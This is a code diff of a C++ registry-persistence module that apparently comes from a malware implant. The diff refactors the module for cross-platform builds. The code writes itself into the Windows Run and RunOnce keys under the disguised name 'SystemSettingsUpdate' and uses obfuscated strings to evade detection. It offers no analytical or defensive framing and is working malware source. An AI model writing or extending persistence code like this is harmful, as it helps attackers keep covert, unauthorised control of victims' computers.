@@ -5,10 +5,8 @@
 #include "utils/FileUtils.h"
 #include "security/Obfuscation.h"
 #include "security/Encryption.h"
-#include <Windows.h>
 #include <string>
 #include <vector>
-#include <cstdint>
 
 // Obfuscated strings
 constexpr auto OBF_REGISTRY_PERSISTENCE = OBFUSCATE("RegistryPersistence");
@@ -17,7 +15,11 @@ constexpr auto OBF_RUNONCE_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\Curren
 constexpr auto OBF_APP_NAME = OBFUSCATE("SystemSettingsUpdate");
 
 RegistryPersistence::RegistryPersistence(Configuration* config)
-    : m_config(config), m_installed(false) {}
+    : BasePersistence(config)
+#if PLATFORM_WINDOWS
+    , m_installedHive(NULL)
+#endif
+{}
 
 bool RegistryPersistence::Install() {
     if (IsInstalled()) {
@@ -25,6 +27,7 @@ bool RegistryPersistence::Install() {
         return true;
     }
 
+#if PLATFORM_WINDOWS
     std::vector<HKEY> hives = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE };
     std::vector<const char*> keys = { OBFUSCATED_RUN_KEY, OBFUSCATED_RUNONCE_KEY };
 
@@ -43,8 +46,13 @@ bool RegistryPersistence::Install() {
 
     LOG_ERROR("Failed to install registry persistence in any location");
     return false;
+#else
+    LOG_WARN("Registry persistence not supported on this platform");
+    return false;
+#endif
 }
 
+#if PLATFORM_WINDOWS
 bool RegistryPersistence::InstallInRegistry(HKEY hive, const char* key) {
     HKEY hKey;
     LONG result = RegOpenKeyExA(hive, key, 0, KEY_WRITE, &hKey);
@@ -73,6 +81,7 @@ bool RegistryPersistence::InstallInRegistry(HKEY hive, const char* key) {
     LOG_DEBUG("Failed to set registry value: " + std::to_string(result));
     return false;
 }
+#endif
 
 bool RegistryPersistence::Remove() {
     if (!m_installed) {
@@ -80,8 +89,9 @@ bool RegistryPersistence::Remove() {
         return true;
     }
 
+#if PLATFORM_WINDOWS
     HKEY hKey;
-    LONG result = RegOpenKeyExA(m_installedHive, m_installedKey, 0, KEY_WRITE, &hKey);
+    LONG result = RegOpenKeyExA(m_installedHive, m_installedKey.c_str(), 0, KEY_WRITE, &hKey);
     if (result != ERROR_SUCCESS) {
         LOG_ERROR("Failed to open registry key for removal: " + std::to_string(result));
         return false;
@@ -98,9 +108,14 @@ bool RegistryPersistence::Remove() {
 
     LOG_ERROR("Failed to remove registry value: " + std::to_string(result));
     return false;
+#else
+    LOG_WARN("Registry persistence not supported on this platform");
+    return false;
+#endif
 }
 
 bool RegistryPersistence::IsInstalled() const {
+#if PLATFORM_WINDOWS
     std::vector<HKEY> hives = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE };
     std::vector<const char*> keys = { OBFUSCATED_RUN_KEY, OBFUSCATED_RUNONCE_KEY };
 
@@ -112,8 +127,12 @@ bool RegistryPersistence::IsInstalled() const {
         }
     }
     return false;
+#else
+    return false;
+#endif
 }
 
+#if PLATFORM_WINDOWS
 bool RegistryPersistence::CheckRegistryKey(HKEY hive, const char* key) const {
     HKEY hKey;
     LONG result = RegOpenKeyExA(hive, key, 0, KEY_READ, &hKey);
@@ -140,3 +159,4 @@ bool RegistryPersistence::CheckRegistryKey(HKEY hive, const char* key) const {
 
     return false;
 }
+#endif
